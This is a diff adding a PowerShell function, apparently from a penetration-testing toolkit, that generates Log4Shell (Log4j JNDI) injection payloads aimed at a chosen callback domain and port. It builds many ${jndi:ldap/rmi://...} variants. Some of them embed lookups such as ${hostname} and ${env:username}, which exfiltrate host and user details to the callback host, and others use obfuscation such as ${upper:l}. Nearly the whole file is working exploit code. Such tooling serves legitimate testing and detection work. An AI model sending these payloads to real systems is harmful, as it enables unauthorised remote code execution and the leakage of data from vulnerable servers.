@@ -1,0 +1,75 @@
+# Author: Scott Sutherland, NetSPI 2021
+# Create-Log4jPayload -Domain "callback.domain.com" -Port 389
+function Create-Log4jPayload
+(
+    [Parameter(Position = 0)][System.String]$Domain,
+    [Parameter(Position = 0)][System.String]$Port,
+    [Parameter(Position = 0)][System.String]$Word = (1..10 | foreach {[char](Get-Random -min 97 -Maximum 122)}) -join ''
+)
+{
+    # Create list of procotols
+    $Protocol = new-object System.Data.DataTable 
+    $null = $Protocol.Columns.Add("value")
+    $null = $Protocol.Rows.Add("ldap")
+    $null = $Protocol.Rows.Add("rmi")
+
+    # Create list of presubdomain values for postion 1
+    $MidPos1 = new-object System.Data.DataTable 
+    $null = $MidPos1.Columns.Add("value")
+    $null = $MidPos1.Rows.Add("")
+    $null = $MidPos1.Rows.Add("127.0.0.1#.")
+    $null = $MidPos1.Rows.Add("localhost#.")
+
+    # Create list of presubdomain values for postion 2
+    $MidPos2 = new-object System.Data.DataTable 
+    $null = $MidPos2.Columns.Add("value")
+    $null = $MidPos2.Rows.Add("")
+    $null = $MidPos2.Rows.Add("`${upper:l}`${upper:o}`${upper:g}.")
+    $null = $MidPos2.Rows.Add("`${hostname}.")
+    $null = $MidPos2.Rows.Add("`${env:username}.")
+    $null = $MidPos2.Rows.Add("`${env:user}.")
+
+
+    # Create list of end position values
+    $EndPos = new-object System.Data.DataTable 
+    $null = $EndPos.Columns.Add("value")
+    $null = $EndPos.Rows.Add("")
+    $null = $EndPos.Rows.Add("/")
+    $null = $EndPos.Rows.Add("/$word")
+    $null = $EndPos.Rows.Add(":$Port")
+    $null = $EndPos.Rows.Add(":$Port/")
+    $null = $EndPos.Rows.Add(":$Port/$word")
+
+    # Payload variations
+    $PayloadVariations = new-object System.Data.DataTable 
+    $null = $PayloadVariations.Columns.Add("payload")
+
+
+    # Generate Payload Variations
+    $Protocol | Select-Object value -ExpandProperty value |
+    Foreach {    
+        $CurrentProtocol = $_       
+        $MidPos1 | Select-Object value -ExpandProperty value |
+        Foreach{
+            $CurrentMidPos1 = $_         
+            $MidPos2 | Select-Object value -ExpandProperty value | 
+            Foreach{
+                $CurrentMidPos2 = $_          
+                $EndPos | Select-Object value -ExpandProperty value |
+                foreach{
+                    $CurrentEndPos = $_
+                    $null = $PayloadVariations.Rows.Add("`${jndi:" + $CurrentProtocol + "://" + $CurrentMidPos1 + $CurrentMidPos2 + $domain + $CurrentEndPos + "}")
+                }   
+            }      
+        }       
+    }
+    $PayloadVariations
+    $PayloadCount = $PayloadVariations.payload.Count
+    Write-Verbose "$PayloadCount payloads were generated"
+
+    # Clear Tables
+    $Protocol.Rows.Clear()
+    $MidPos1.Rows.Clear()
+    $MidPos2.Rows.Clear()
+    $EndPos.Rows.Clear()
+}
